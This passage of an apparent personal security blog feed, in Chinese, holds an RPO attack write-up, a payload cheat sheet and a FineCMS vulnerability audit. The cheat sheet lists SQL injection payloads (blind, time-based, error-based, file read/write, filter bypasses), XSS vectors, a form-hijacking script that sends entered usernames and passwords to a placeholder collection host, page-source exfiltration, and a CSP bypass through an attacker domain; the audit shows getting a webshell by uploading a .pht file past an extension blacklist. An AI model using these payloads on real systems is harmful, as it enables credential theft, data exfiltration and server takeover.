<h2 id="引入js文件攻击-1"><a href="#引入js文件攻击-1" class="headerlink" title="引入js文件攻击 (1)"></a>引入js文件攻击 (1)</h2><p><code>../</code>在url中表示上一级的意思利用这个我们可以加载到其他目录下的文件<br>页面以类似这种方式引入js文件时<br><code>&lt;script type=&quot;text/javascript&quot; src=&quot;../jquery.js&quot;&gt;&lt;/script&gt;</code><br>当我们访问<code>http://127.0.0.1/rpo/1/3/..%2f2/4/example.html</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">服务端 http://127.0.0.1/rpo/1/2/4/example.php</div><div class="line">正常加载应 &lt;script type=&quot;text/javascript&quot; src=&quot;http://127.0.0.1/rpo/1/jquery.js&quot;&gt;&lt;/script&gt;</div><div class="line">浏览器 http://127.0.0.1/rpo/1/3/..%2f2/4/example.php</div><div class="line">加载 http://127.0.0.1/rpo/1/3/jquery.js(evil)</div></pre></td></tr></table></figure></p>
<p>如果我们能得知上传文件路径通过RPO让Web页面用js解析我们上传的文件chrome不能将图片解析为js但可以将类似txt,doc,rar解析为js就能触发反射性xss<br>但这样利用局限很大要求我们能控制上传文件的文件名和文件目录名</p>
<h2 id="引入js文件攻击-2"><a href="#引入js文件攻击-2" class="headerlink" title="引入js文件攻击 (2)"></a>引入js文件攻击 (2)</h2><p>如果网站有上传和下载功能<br>页面以类似这种方式引入js文件时<br><code>&lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery.js&quot;&gt;&lt;/script&gt;</code><br>我们访问<code>http://127.0.0.1/rpo/download.php/..%2findex.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">服务端 http://127.0.0.1/rpo/index.php</div><div class="line">正常加载应 http://127.0.0.1/rpo/js/jquery.js</div><div class="line">浏览器 http://127.0.0.1/rpo/download.php/..%2findex.php</div><div class="line">加载 http://127.0.0.1/rpo/download.php/js/jquery.js</div></pre></td></tr></table></figure>
<p><code>http://127.0.0.1/rpo/download.php</code>下载的正是我们上传的恶意文件<br><img src="rpo1.png" alt=""></p>
<h2 id="引入恶意css文件攻击IE"><a href="#引入恶意css文件攻击IE" class="headerlink" title="引入恶意css文件攻击IE"></a>引入恶意css文件攻击IE</h2><p>当页面中提供类似搜索功能,能把搜索的字符串打印出来<br>页面以类似这种方式引入css文件时<br><code>&lt;link href=&quot;../../styles.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;</code><br><code>http://127.0.0.1/ci/index.php/welcome/index/(string)</code>能打印搜索的字符串      </p>
<p>我们访问<br><code>http://127.0.0.1/ci/index.php/welcome/index/{}*{background:red}/..%2f..%2f..%2f../rpo/example.html</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">服务端 http://127.0.0.1/ci/rpo/example.html</div><div class="line">正常加载应 http://127.0.0.1/styles.css</div><div class="line">浏览器 http://127.0.0.1/ci/index.php/welcome/index/&#123;&#125;*&#123;background:red&#125;/..%2f..%2f..%2f../rpo/example.html</div><div class="line">加载 http://127.0.0.1/ci/index.php/welcome/index/&#123;&#125;*&#123;background:red&#125;</div></pre></td></tr></table></figure></p>
<p><code>http://127.0.0.1/ci/index.php/welcome/index/{}*{background:red}</code>此页面内的内容则包含了我们的恶意css代码浏览器忽视其他无关的内容正常执行</p>
<p><img src="rpo2.png" alt=""></p>
<p>在IE中可以使用<strong>expression()</strong>在css中执行js从达到xss攻击</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说RPO的攻击还是比较鸡肋的费了大力气也只能进行反射性xss攻击而已<del>我也是看完才知道这么鸡肋QAQ</del>,但思路很有意思搜索功能的利用很有创意<br>而且看了这么多英文文献突然又感觉过六级有望了QAQ</p>
<h2 id="文献"><a href="#文献" class="headerlink" title="文献"></a>文献</h2><p><a href="http://www.mbsd.jp/Whitepaper/rpo.pdf" target="_blank" rel="external">http://www.mbsd.jp/Whitepaper/rpo.pdf</a><br><a href="http://blog.portswigger.net/2015/02/prssi.html" target="_blank" rel="external">http://blog.portswigger.net/2015/02/prssi.html</a><br><a href="http://blog.innerht.ml/rpo-gadgets/" target="_blank" rel="external">http://blog.innerht.ml/rpo-gadgets/</a>                  </p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;RPO-Relative-Path-Overwrite-相对路径覆盖&quot;&gt;&lt;a href=&quot;#RPO-Relative-Path-Overwrite-相对路径覆盖&quot; class=&quot;headerlink&quot; title=&quot;RPO (Relative Path Overwrite) 相对路径覆盖&quot;&gt;&lt;/a&gt;RPO (Relative Path Overwrite) 相对路径覆盖&lt;/h1&gt;&lt;hr&gt;
&lt;h2 id=&quot;什么RPO&quot;&gt;&lt;a href=&quot;#什么RPO&quot; class=&quot;headerlink&quot; title=&quot;什么RPO&quot;&gt;&lt;/a&gt;什么RPO&lt;/h2&gt;&lt;p&gt;RPO就是一种利用服务端与浏览器之间对 &lt;strong&gt;url编码&lt;/strong&gt; 的处理方式不同所发起的攻击&lt;br&gt;可以导致Web页面引入非法的css文件和javascript文件导致xss&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>笔记</title>
    <link href="https://5eafood.github.io/2017/03/22/Some-Notes/"/>
    <id>https://5eafood.github.io/2017/03/22/Some-Notes/</id>
    <published>2017-03-22T15:14:48.000Z</published>
    <updated>2017-03-22T18:46:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><hr>
<p>一些会用到的payload收集起来避免临时去找不定期更新</p>
<a id="more"></a>
<h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>select username from user where username like binary(0x66);   binary() 将十六进制0x或二进制0b转为字符串<br>select 1 from (select username from user where username=’’);<br>where username between ‘a’ and ‘z’   between 0x61 and 0x7a<br>wherer username regexp ‘’;<br>mid() left() substr() substring() ascii() ord() strcmp(left(‘password’,1), 0x70) = 0</p>
<h3 id="延迟注入"><a href="#延迟注入" class="headerlink" title="延迟注入"></a>延迟注入</h3><p>if( length(database())&gt;4, sleep(0),sleep(5));<br>if( 1=mid( lpad(  bin( ord(  mid(  select @@version  1,1)  )  )   ,8,0)   ,1,1), sleep(0), sleep(5));<br>benchmark() 执行次数 执行动作</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>SELECT 1 FROM (select count(<em>),concat(floor(rand(0)</em>2),(select concat(0x20,(select username from user limit 0,1),0x20,user(),0x20,version())))a from information_schema.tables group by a)b;<br>select exp(~(select*from(select user())x));  ~取反 exp溢出报错<br><a href="http://blackfan.ru/mysql_game_v2/" target="_blank" rel="external">http://blackfan.ru/mysql_game_v2/</a>  </p>
<h3 id="读数据"><a href="#读数据" class="headerlink" title="读数据"></a>读数据</h3><p>库名 select schema_name from information_schema.SCHEMATA<br>表名 select table_name from information_schema.tables where table_schema=database()<br>字段 select column_name from information_schema.columns where table_name=<br>select GROUP_CONCAT(DISTINCT table_name) from information_schema.columns               </p>
<h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><p>权限要求高<br>select hex(load_file(0x…));<br>select 0x… into outfile ‘path’;  dumpfile</p>
<h3 id="绕过滤"><a href="#绕过滤" class="headerlink" title="绕过滤"></a>绕过滤</h3><p><code>where 1=0.0union select</code> 小数后面可以直接接命令,可以用做绕正则<br>union select 逗号不能用时 可以用join构造列  <code>select * from (select 1 as a)x join (select 2 as b)y;</code><br>/<em>*/  \x0d\x0a  /</em>!11111select*/  select(username)from(user)  宽字节%df<br>unicode同形字<a href="http://www.irongeek.com/homoglyph-attack-generator.php" target="_blank" rel="external">http://www.irongeek.com/homoglyph-attack-generator.php</a>        </p>
<blockquote>
<p>MYSQL 中 utf8_unicode_ci 和 utf8_general_ci 两种编码格式, utf8_general_ci不区分大小写, Ä = A, Ö = O, Ü = U 这三种条件都成立,对于utf8_general_ci下面的等式成立ß = s 但是对于utf8_unicode_ci下面等式才成立ß = ss </p>
</blockquote>
<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><h3 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">''</span> &gt;</span><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">''</span> <span class="attr">onerror</span>=<span class="string">;</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">import</span> <span class="attr">href</span>=<span class="string">''</span> &gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">window.location.href='';</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<h3 id="ajax"><a href="#ajax" class="headerlink" title="ajax"></a>ajax</h3><p>ajax要注意跨域问题<br><code>header(&#39;Access-Control-Allow-Origin: *&#39;);</code>        </p>
<h4 id="xmlhttp"><a href="#xmlhttp" class="headerlink" title="xmlhttp"></a>xmlhttp</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"https://"</span>, <span class="literal">true</span>);</div><div class="line">xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</div><div class="line">xmlhttp.send(<span class="string">"data="</span> + data);</div><div class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></td></tr></table></figure>
<p>获得页面源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;window.location.href=http://domain/rec.php?x=escape(xmlhttp.responseText) &lt;/script&gt;</div></pre></td></tr></table></figure></p>
<h4 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;script src=<span class="string">"https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div><div class="line">&lt;script&gt;</div><div class="line">$.get(<span class="string">'url'</span>,callback);</div><div class="line"></div><div class="line">$.post(<span class="string">'url'</span>,&#123;</div><div class="line">    <span class="attr">data1</span>:<span class="string">''</span>,<span class="attr">data2</span>:<span class="string">''</span>&#125;, callback)</div><div class="line"></div><div class="line">$.ajax(&#123;</div><div class="line">    <span class="attr">type</span>:<span class="string">"get/post"</span></div><div class="line">    url:<span class="string">""</span>,</div><div class="line">    <span class="attr">data</span>:<span class="string">""</span>,</div><div class="line">    <span class="attr">success</span>:fuction()&#123;&#125;,</div><div class="line">&#125;)</div><div class="line"></div><div class="line">$.getScript(<span class="string">'url'</span>)</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>
<h3 id="表单劫持"><a href="#表单劫持" class="headerlink" title="表单劫持"></a>表单劫持</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_form</span>(<span class="params">user</span>) </span>&#123;</div><div class="line"><span class="keyword">var</span> f = <span class="built_in">document</span>.createElement(<span class="string">"form"</span>);</div><div class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(f);</div><div class="line"><span class="keyword">var</span> e1 = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</div><div class="line">e1.type = <span class="string">"text"</span>;</div><div class="line">e1.name = e1.id = <span class="string">"username"</span>;</div><div class="line">e1.value = user;</div><div class="line">f.appendChild(e1);</div><div class="line"><span class="keyword">var</span> e = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</div><div class="line">e.name = e.type = e.id = <span class="string">"password"</span>;</div><div class="line">f.appendChild(e);</div><div class="line"></div><div class="line">$.get(<span class="string">'http://domain/rec.php?username='</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.getElementById(<span class="string">"username"</span>).value)+<span class="string">'password='</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.getElementById(<span class="string">"password"</span>).value));</div></pre></td></tr></table></figure>
<h3 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;         </div><div class="line">s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;你的js地址&apos;               </div><div class="line">&lt;iframe src=&quot;data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;&gt;&lt;/iframe&gt;</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload = <span class="string">"&lt;img src=/ onerror=javascript:document.write(String.fromCharCode(&#123;&#125;));&gt;"</span>.format(<span class="string">','</span>.join([str(ord(c)) <span class="keyword">for</span> c <span class="keyword">in</span> realpayload]))</div></pre></td></tr></table></figure>
<p>利用prefetch绕csp <code>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//abcd1234.attacker.ch&quot;&gt;</code> </p>
<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><h3 id="包含"><a href="#包含" class="headerlink" title="包含"></a>包含</h3><p>读源码<code>php://filter/convert.base64-encode/resource=</code><br>包含zip 将shell.php压缩为zip改名为aa.jpg上传后包含<code>phar://path/aa.jpg/shell</code>   当已知phpinfo时可以包含临时文件</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;笔记&quot;&gt;&lt;a href=&quot;#笔记&quot; class=&quot;headerlink&quot; title=&quot;笔记&quot;&gt;&lt;/a&gt;笔记&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;一些会用到的payload收集起来避免临时去找不定期更新&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>finecms代码审计</title>
    <link href="https://5eafood.github.io/2017/03/22/finecms/"/>
    <id>https://5eafood.github.io/2017/03/22/finecms/</id>
    <published>2017-03-22T15:14:40.000Z</published>
    <updated>2017-03-22T18:45:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="finecms代码审计"><a href="#finecms代码审计" class="headerlink" title="finecms代码审计"></a>finecms代码审计</h1><hr>
<a id="more"></a>
<h1 id="后台sql注入"><a href="#后台sql注入" class="headerlink" title="后台sql注入"></a>后台sql注入</h1><p>搜索功能的$kw变量都没进入过滤函数用的类似<code>like &quot;%$kw%&quot;</code>语句但前台的搜索使用双引号<code>&quot;</code>包的<br>似乎是被codeigniter的xss保护滤掉了=_= 然而后台几个搜索是用单引号<code>&#39;</code>可以利用毕竟后台就比较鸡肋了      </p>
<p><code>FineCMS2.10\controllers\admin\ContentController.php</code><br><img src="finecms1.png" alt=""></p>
<p><code>FineCMS2.10\controllers\admin\MemberController.php</code><br><img src="finecms2.png" alt=""></p>
<p><code>FineCMS2.10\controllers\admin\RelatedlinkController.php</code><br><img src="finecms3.png" alt=""></p>
<p><img src="finecms4.png" alt=""></p>
<p>投了补天没过因为后台漏洞是不行的没看清漏洞要求QAQ</p>
<h1 id="恶意文件上传"><a href="#恶意文件上传" class="headerlink" title="恶意文件上传"></a>恶意文件上传</h1><p><code>controllers\AttachmentController.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filesAction</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">$this</span>-&gt;memberCheck();</div><div class="line">        $setting = urldecode(<span class="keyword">$this</span>-&gt;get(<span class="string">'setting'</span>));</div><div class="line">        <span class="keyword">list</span>($type, $size) = explode(<span class="string">'|'</span>, $setting);</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($type) || <span class="keyword">empty</span>($size)) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;attMsg(lang(<span class="string">'att-10'</span>));</div><div class="line">        &#125;</div><div class="line">        $type = base64_decode($type);</div><div class="line">        $data = <span class="string">''</span>;</div><div class="line">        $_type = explode(<span class="string">','</span>, $type);</div><div class="line">        <span class="keyword">foreach</span> ($_type <span class="keyword">as</span> $t) &#123;</div><div class="line">            $data.= <span class="string">'*.'</span> . $t . <span class="string">';'</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">$this</span>-&gt;view-&gt;assign(<span class="keyword">array</span>(</div><div class="line">            <span class="string">'size'</span> =&gt; (int)$size,</div><div class="line">            <span class="string">'type'</span> =&gt; $type,</div><div class="line">            <span class="string">'data'</span> =&gt; $data,</div><div class="line"><span class="string">'admin'</span> =&gt; <span class="keyword">$this</span>-&gt;getAdmin(),</div><div class="line">            <span class="string">'filesize'</span> =&gt; <span class="number">1024</span> * $size, <span class="comment">//转换成MB</span></div><div class="line">            <span class="string">'sessionid'</span> =&gt; session_id(),</div><div class="line"><span class="string">'document'</span> =&gt; <span class="keyword">$this</span>-&gt;get(<span class="string">'document'</span>)</div><div class="line">        ));</div><div class="line">        <span class="keyword">$this</span>-&gt;view-&gt;display(<span class="string">'../admin/attachment_swfupload'</span>);</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p><code>$type</code>参数是post可控的上传文件后缀就是<code>$type</code>的base64解码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ext = $upload-&gt;fileext();</div><div class="line"><span class="keyword">if</span> (stripos($ext, <span class="string">'php'</span>) !== <span class="keyword">FALSE</span></div><div class="line">|| stripos($ext, <span class="string">'asp'</span>) !== <span class="keyword">FALSE</span></div><div class="line">|| stripos($ext, <span class="string">'aspx'</span>) !== <span class="keyword">FALSE</span></div><div class="line">) &#123;</div><div class="line"><span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'result'</span> =&gt; <span class="string">'文件格式被系统禁止'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>后缀名只做了基础的黑名单限制但在ubuntu和debian下的lamp可以解析<strong>pht</strong>和<strong>phtml</strong>为php文件        </p>
<p>我们可以上传.pht文件getshell<br><img src="finecms5.png" alt=""><br><code>emlwLHJhcg==</code>为<code>&quot;zip,rar&quot;.encode(base64)</code>我们将他改为pht的base64<br><img src="finecms6.png" alt=""><br><img src="finecms7.png" alt=""></p>
<p>xp下无法解析pht但kali下可以<br><img src="finecms8.png" alt=""></p>
<p>这个投的补天结果被人先投了TAT其实我很早就找到了但忘记提交了TAT</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;finecms代码审计&quot;&gt;&lt;a href=&quot;#finecms代码审计&quot; class=&quot;headerlink&quot; title=&quot;finecms代码审计&quot;&gt;&lt;/a&gt;finecms代码审计&lt;/h1&gt;&lt;hr&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
